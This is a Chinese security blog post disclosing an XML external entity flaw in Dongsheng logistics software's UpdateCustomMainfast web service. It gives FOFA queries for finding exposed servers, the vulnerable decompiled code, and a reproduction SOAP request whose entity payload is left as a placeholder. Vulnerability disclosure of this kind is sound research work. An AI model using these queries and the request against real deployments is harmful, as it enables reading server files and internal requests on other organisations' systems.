---
title: "东胜物流软件 UpdateCustomMainfast XXE漏洞"
source: https://mrxn.net/jswz/dongsheng-UpdateCustomMainfast-XXE.html
asset_dir: assets/东胜物流软件-updatecustommainfast-xxe漏洞
---

# 东胜物流软件 UpdateCustomMainfast XXE漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/7/28 00:08
* 716浏览
* [2评论](#comment)
* 23分钟阅读

深入探索

application

应用

应用程序


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

东胜物流软件是一款广泛应用于物流行业的信息管理系统，主要用于货物运输、仓储管理以及供应链协同等场景，帮助企业实现物流业务的高效运作。该软件的 `UpdateCustomMainfast` 接口存在 XML 外部实体注入（[XXE](https://mrxn.net/tag/XXE "XXE")）漏洞，攻击者可以通过构造恶意的 XML 输入数据，触发该接口解析外部实体，从而读取服务器上的敏感文件或发起内部网络请求。成功利用该漏洞可能导致敏感信息泄露、系统配置暴露，甚至在特定环境下实现进一步的权限提升或系统控制，严重威胁企业数据安全和业务连续性。

物流软件安全

# 影响版本

# fofa语法

> body="FeeCodes/CompanysAdapter.aspx" || body="dhtmlxcombo\_whp.js" || body="dongshengsoft" || body="theme/dhtmlxcombo.css"

# 漏洞分析

深入探索

安全运维咨询

防火墙软件

安全

直接看 `UpdateCustomMainfast` 的实现逻辑

```
  public string UpdateCustomMainfast(
    string Xdoc,
    string XdocAfter,
    string Corpid,
    string SenderOp,
    string SenderHandphone,
    string SenderEmail,
    string SenderFax,
    string Mblno)
  {
    try
    {
      bool AfterDoc = false;
      string filename = Mblno;
      string str1 = filename + "_";
      string str2 = $"d:\\Manifest\\Sendmain\\{filename}.xml";
      string str3 = $"d:\\Manifest\\Sendmain\\{filename}.zip";
      string str4 = $"d:\\Manifest\\Sendafter\\{str1}.xml";
      string str5 = $"d:\\Manifest\\Sendafter\\{str1}.zip";
      XmlDocument xmlDocument = new XmlDocument();
      xmlDocument.LoadXml(Xdoc);
```

深入探索

网页浏览器

文本剥离工具

安全认证考试

参数 `Xdoc` 无任何过滤或校验，直接使用 `XmlDocument` 进行解析，造成[XXE](https://mrxn.net/tag/XXE "XXE")漏洞，朴实无华。

漏洞扫描服务

# 漏洞复现

```
POST /Webservice/DsWebService.asmx HTTP/1.1
Host: dongsheng.mrxn.net
Content-Type: application/soap+xml;charset=UTF-8;action="DsWebService/UpdateCustomMainfast"

<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:dsw="DsWebService">
   <soap:Header/>
   <soap:Body>
      <dsw:UpdateCustomMainfast>
         <!--Optional:-->
         <dsw:Xdoc>XXEPOC</dsw:Xdoc>
         <!--Optional:-->
         <dsw:XdocAfter>1</dsw:XdocAfter>
         <!--Optional:-->
         <dsw:Corpid>1</dsw:Corpid>
         <!--Optional:-->
         <dsw:SenderOp>1</dsw:SenderOp>
         <!--Optional:-->
         <dsw:SenderHandphone>1</dsw:SenderHandphone>
         <!--Optional:-->
         <dsw:SenderEmail>1</dsw:SenderEmail>
         <!--Optional:-->
         <dsw:SenderFax>1</dsw:SenderFax>
         <!--Optional:-->
         <dsw:Mblno>1</dsw:Mblno>
      </dsw:UpdateCustomMainfast>
   </soap:Body>
</soap:Envelope>
```

[![东胜物流软件 UpdateCustomMainfast XXE漏洞](images/img-001-62a4050a7286.webp)](https://image.mrxn.net/e778aa2c831746f68f2bec7beb29e4c6.webp)

成功在DNSLOG平台收到DNS和HTTP请求。

代码安全审计

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#0day](https://mrxn.net/tag/0day)
* [#XXE](https://mrxn.net/tag/XXE)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[东胜物流软件 UpdateCustomMainfast XXE漏洞](https://mrxn.net/jswz/dongsheng-UpdateCustomMainfast-XXE.html)  
文章链接：<https://mrxn.net/jswz/dongsheng-UpdateCustomMainfast-XXE.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/dongsheng-UpdateCustomMainfast-XXE.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

计算机服务器

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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